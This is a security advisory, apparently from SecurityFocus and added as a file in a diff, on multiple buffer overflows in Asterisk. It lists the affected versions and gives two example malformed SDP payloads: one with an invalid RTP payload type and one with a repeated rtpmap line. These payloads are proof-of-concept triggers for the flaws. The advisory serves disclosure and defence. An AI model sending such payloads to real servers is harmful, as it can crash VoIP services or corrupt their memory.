@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/28308/info
+
+Asterisk is prone to multiple buffer-overflow vulnerabilities because it fails to perform adequate boundary checks on user-supplied data before copying it to insufficiently sized buffers.
+
+Exploiting these issues may allow an attacker to corrupt memory and cause denial-of-service conditions or potentially execute arbitrary code in the context of the application.
+
+These issues affect the following versions:
+
+Asterisk Open Source prior to 1.4.18.1 and 1.4.19-rc3.
+Asterisk Open Source prior to 1.6.0-beta6
+Asterisk Business Edition prior to C.1.6.1
+AsteriskNOW prior to 1.0.2
+Asterisk Appliance Developer Kit prior to Asterisk 1.4 revision 109386
+s800i (Asterisk Appliance) prior to 1.1.0.2 
+
+Example invalid SDP payload (invalid RTP payload type is 780903144):
+
+v=0
+o=- 817933771 817933775 IN IP4 10.10.1.101
+s=session-name
+c=IN IP4 10.10.1.101
+t=0 0
+m=audio 5000 RTP/AVP 0
+a=rtpmap:780903144 PCMU/8000
+a=rtpmap:4 G723/8000/1
+a=rtpmap:97 telephone-event/8000
+
+Example SDP payload:
+v=0
+o=- 817933771 817933775 IN IP4 10.10.1.101
+s=session-name
+c=IN IP4 10.10.1.101
+t=0 0
+m=audio 5000 RTP/AVP 0
+a=rtpmap:0 PCMU/8000
+[... repeat this line ...]
+a=rtpmap:4 G723/8000/1
+a=rtpmap:97 telephone-event/8000 
